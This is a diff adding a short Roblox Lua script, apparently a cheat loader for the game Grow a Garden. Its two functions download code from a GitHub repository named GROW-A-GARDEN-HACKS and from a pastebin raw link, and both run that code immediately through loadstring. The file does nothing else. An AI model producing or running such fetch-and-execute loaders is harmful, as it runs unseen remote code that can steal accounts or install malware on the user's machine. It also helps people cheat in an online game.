@@ -1,0 +1,10 @@
+
+local function r()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/turkeyjhonny/GROW-A-GARDEN-HACKS/refs/heads/main/Yyy'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://pastebin.com/raw/feWJgdmL'))()
+end
+
+task.spawn(r)
+task.spawn(farm)
